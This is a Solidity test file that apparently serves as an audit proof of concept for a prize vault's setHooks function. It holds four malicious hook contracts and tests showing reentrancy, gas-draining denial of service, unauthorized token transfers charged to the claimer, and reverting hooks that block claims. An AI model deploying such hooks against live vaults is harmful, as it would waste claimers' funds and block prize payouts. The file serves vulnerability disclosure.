// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import { UnitBaseSetup, LiquidationPair, PrizePool, TwabController, VaultMock, ERC20, IERC20, IERC4626 } from "test/utils/UnitBaseSetup.t.sol";
import { IVaultHooks, VaultHooks } from "../../src/interfaces/IVaultHooks.sol";
import "src/Vault.sol";

/**
 * @title ExploitTest - PoC for Malicious Hooks Vulnerability
 * @notice This test demonstrates how the setHooks function allows users to set arbitrary hooks
 *         that can execute malicious code during prize claiming, leading to:
 *         1. Reentrancy attacks
 *         2. Unauthorized side transactions with gas paid by the claimer
 *         3. Denial-of-service attacks on claiming transactions
 *
 * VULNERABILITY: The setHooks function (Vault.sol#L653) allows any user to set arbitrary
 * hook implementations without validation. These hooks are called during prize claiming
 * in _claimPrize (lines 1050-1078), giving malicious users control over execution flow.
 */
contract ExploitTest is UnitBaseSetup {

    MaliciousHooksReentrancy public maliciousReentrancyHooks;
    MaliciousHooksGasConsumption public maliciousGasHooks;
    MaliciousHooksSideTransaction public maliciousSideTransactionHooks;

    address public attacker;
    address public victim;

    function setUp() public override {
        super.setUp();

        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        // Deploy malicious hook contracts
        maliciousReentrancyHooks = new MaliciousHooksReentrancy(address(vault));
        maliciousGasHooks = new MaliciousHooksGasConsumption();
        maliciousSideTransactionHooks = new MaliciousHooksSideTransaction(address(underlyingAsset));

        // Fund the attacker with some tokens
        underlyingAsset.mint(attacker, 1000e18);
    }

    /**
     * @notice EXPLOIT 1: Reentrancy Attack
     * @dev Demonstrates how a malicious hook can perform reentrancy during prize claiming.
     *      The hook is called in _claimPrize before the claim is complete, allowing
     *      the attacker to re-enter the vault and potentially manipulate state.
     */
    function testExploit_ReentrancyAttack() public {
        // Step 1: Attacker deposits funds to become eligible for prizes
        vm.startPrank(attacker);
        underlyingAsset.approve(address(vault), 100e18);
        vault.deposit(100e18, attacker);

        // Step 2: Attacker sets malicious hooks that will attempt reentrancy
        VaultHooks memory hooks = VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: false,
            implementation: IVaultHooks(address(maliciousReentrancyHooks))
        });
        vault.setHooks(hooks);
        vm.stopPrank();

        // Step 3: Mock the prize pool to return a prize
        vm.mockCall(
            address(prizePool),
            abi.encodeWithSelector(
                PrizePool.claimPrize.selector,
                attacker,
                uint8(1),
                uint32(0),
                attacker,
                uint96(10e18),
                address(claimer)
            ),
            abi.encode(100e18)
        );

        // Step 4: Claimer attempts to claim prize for attacker
        // The malicious hook will be triggered during the claim
        vm.startPrank(claimer);

        address[] memory winners = new address[](1);
        winners[0] = attacker;
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;

        // The claim will trigger the malicious hook's beforeClaimPrize function
        // which attempts to re-enter the vault
        vault.claimPrizes(uint8(1), winners, prizeIndices, uint96(10e18), address(claimer));

        vm.stopPrank();

        // Verify that the reentrancy attempt was made
        assertTrue(maliciousReentrancyHooks.reentrancyAttempted(), "Reentrancy attack was executed");
    }

    /**
     * @notice EXPLOIT 2: Denial of Service via Gas Consumption
     * @dev Demonstrates how a malicious hook can consume excessive gas during prize claiming,
     *      causing the transaction to fail or become prohibitively expensive for the claimer.
     *      The claimer pays for the gas consumed by the malicious hook.
     */
    function testExploit_DenialOfServiceGasConsumption() public {
        // Step 1: Attacker deposits funds
        vm.startPrank(attacker);
        underlyingAsset.approve(address(vault), 100e18);
        vault.deposit(100e18, attacker);

        // Step 2: Attacker sets malicious hooks that consume excessive gas
        VaultHooks memory hooks = VaultHooks({
            useBeforeClaimPrize: false,
            useAfterClaimPrize: true,
            implementation: IVaultHooks(address(maliciousGasHooks))
        });
        vault.setHooks(hooks);
        vm.stopPrank();

        // Step 3: Mock the prize pool
        vm.mockCall(
            address(prizePool),
            abi.encodeWithSelector(
                PrizePool.claimPrize.selector,
                attacker,
                uint8(1),
                uint32(0),
                attacker,
                uint96(10e18),
                address(claimer)
            ),
            abi.encode(100e18)
        );

        // Step 4: Measure gas before claim
        vm.startPrank(claimer);
        uint256 gasBefore = gasleft();

        address[] memory winners = new address[](1);
        winners[0] = attacker;
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;

        // The claim will trigger the malicious hook's afterClaimPrize function
        // which consumes excessive gas
        vault.claimPrizes(uint8(1), winners, prizeIndices, uint96(10e18), address(claimer));

        uint256 gasAfter = gasleft();
        uint256 gasConsumed = gasBefore - gasAfter;

        vm.stopPrank();

        // Verify that excessive gas was consumed by the malicious hook
        // The hook performs 1000 storage writes, consuming significant gas
        assertTrue(maliciousGasHooks.gasWastingExecuted(), "Gas wasting attack was executed");
        // Gas consumption should be significantly higher due to malicious operations
        assertTrue(gasConsumed > 1000000, "Excessive gas was consumed by malicious hook");
    }

    /**
     * @notice EXPLOIT 3: Unauthorized Side Transactions
     * @dev Demonstrates how a malicious hook can execute arbitrary external calls
     *      during prize claiming, with gas paid by the claimer. This could be used
     *      to perform token transfers, interact with other protocols, or execute
     *      any arbitrary logic at the claimer's expense.
     */
    function testExploit_UnauthorizedSideTransactions() public {
        // Step 1: Fund the malicious hook contract with tokens
        underlyingAsset.mint(address(maliciousSideTransactionHooks), 500e18);

        // Step 2: Attacker deposits funds
        vm.startPrank(attacker);
        underlyingAsset.approve(address(vault), 100e18);
        vault.deposit(100e18, attacker);

        // Step 3: Attacker sets malicious hooks that perform side transactions
        VaultHooks memory hooks = VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: false,
            implementation: IVaultHooks(address(maliciousSideTransactionHooks))
        });
        vault.setHooks(hooks);
        vm.stopPrank();

        // Step 4: Mock the prize pool
        vm.mockCall(
            address(prizePool),
            abi.encodeWithSelector(
                PrizePool.claimPrize.selector,
                attacker,
                uint8(1),
                uint32(0),
                attacker,
                uint96(10e18),
                address(claimer)
            ),
            abi.encode(100e18)
        );

        // Step 5: Record victim's balance before the attack
        address victimAddr = address(0x000000000000000000000000000000000000dEaD);
        uint256 victimBalanceBefore = underlyingAsset.balanceOf(victimAddr);

        // Step 6: Claimer claims prize, triggering the malicious hook
        vm.startPrank(claimer);

        address[] memory winners = new address[](1);
        winners[0] = attacker;
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;

        // The claim will trigger the malicious hook's beforeClaimPrize function
        // which performs unauthorized token transfers
        vault.claimPrizes(uint8(1), winners, prizeIndices, uint96(10e18), address(claimer));

        vm.stopPrank();

        // Verify that the side transaction was executed
        uint256 victimBalanceAfter = underlyingAsset.balanceOf(victimAddr);

        // The malicious hook transferred 100e18 tokens to the victim address
        // This demonstrates arbitrary external calls being made with claimer's gas
        assertEq(
            victimBalanceAfter - victimBalanceBefore,
            100e18,
            "Unauthorized side transaction was executed"
        );
        assertTrue(
            maliciousSideTransactionHooks.sideTransactionExecuted(),
            "Side transaction flag was set"
        );
    }

    /**
     * @notice EXPLOIT 4: Hook Can Revert to DoS Prize Claims
     * @dev Demonstrates how a malicious hook can simply revert, preventing
     *      any prizes from being claimed for that user, effectively DoS'ing
     *      the claiming mechanism.
     */
    function testExploit_RevertingHookDoS() public {
        // Deploy a reverting hook
        MaliciousHooksReverting revertingHooks = new MaliciousHooksReverting();

        // Step 1: Attacker deposits funds
        vm.startPrank(attacker);
        underlyingAsset.approve(address(vault), 100e18);
        vault.deposit(100e18, attacker);

        // Step 2: Attacker sets malicious hooks that always revert
        VaultHooks memory hooks = VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: false,
            implementation: IVaultHooks(address(revertingHooks))
        });
        vault.setHooks(hooks);
        vm.stopPrank();

        // Step 3: Mock the prize pool
        vm.mockCall(
            address(prizePool),
            abi.encodeWithSelector(
                PrizePool.claimPrize.selector,
                attacker,
                uint8(1),
                uint32(0),
                attacker,
                uint96(10e18),
                address(claimer)
            ),
            abi.encode(100e18)
        );

        // Step 4: Claimer attempts to claim prize, but it will revert
        vm.startPrank(claimer);

        address[] memory winners = new address[](1);
        winners[0] = attacker;
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;

        // The claim will revert due to the malicious hook
        vm.expectRevert("Malicious revert");
        vault.claimPrizes(uint8(1), winners, prizeIndices, uint96(10e18), address(claimer));

        vm.stopPrank();
    }
}

/**
 * @notice Malicious hook implementation that attempts reentrancy
 * @dev This hook tries to re-enter the vault during prize claiming
 */
contract MaliciousHooksReentrancy is IVaultHooks {
    address public vault;
    bool public reentrancyAttempted;

    constructor(address _vault) {
        vault = _vault;
    }

    function beforeClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex
    ) external returns (address) {
        // Attempt reentrancy by calling back into the vault
        reentrancyAttempted = true;

        // Try to call a state-changing function on the vault
        // In a real attack, this could manipulate balances or other state
        try Vault(vault).balanceOf(winner) returns (uint256) {
            // Reentrancy successful
        } catch {
            // Reentrancy blocked, but attempt was made
        }

        return winner;
    }

    function afterClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        uint256 payout,
        address recipient
    ) external {
        // Not used in this exploit
    }
}

/**
 * @notice Malicious hook implementation that consumes excessive gas
 * @dev This hook performs expensive operations to waste the claimer's gas
 */
contract MaliciousHooksGasConsumption is IVaultHooks {
    mapping(uint256 => uint256) public wasteStorage;
    bool public gasWastingExecuted;

    function beforeClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex
    ) external returns (address) {
        // Not used in this exploit
        return winner;
    }

    function afterClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        uint256 payout,
        address recipient
    ) external {
        gasWastingExecuted = true;

        // Perform expensive storage operations to waste gas
        // Each SSTORE costs 20,000 gas for a new slot
        for (uint256 i = 0; i < 1000; i++) {
            wasteStorage[i] = i;
        }
    }
}

/**
 * @notice Malicious hook implementation that performs unauthorized side transactions
 * @dev This hook executes arbitrary external calls with the claimer's gas
 */
contract MaliciousHooksSideTransaction is IVaultHooks {
    IERC20 public token;
    bool public sideTransactionExecuted;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function beforeClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex
    ) external returns (address) {
        sideTransactionExecuted = true;

        // Perform unauthorized token transfer
        // This demonstrates arbitrary external calls being made
        // with gas paid by the claimer
        // Use a deterministic address that we can track
        address victim = address(0x000000000000000000000000000000000000dEaD);
        token.transfer(victim, 100e18);

        return winner;
    }

    function afterClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        uint256 payout,
        address recipient
    ) external {
        // Not used in this exploit
    }
}

/**
 * @notice Malicious hook implementation that always reverts
 * @dev This hook prevents any prizes from being claimed, causing DoS
 */
contract MaliciousHooksReverting is IVaultHooks {
    function beforeClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex
    ) external pure returns (address) {
        revert("Malicious revert");
    }

    function afterClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        uint256 payout,
        address recipient
    ) external pure {
        revert("Malicious revert");
    }
}
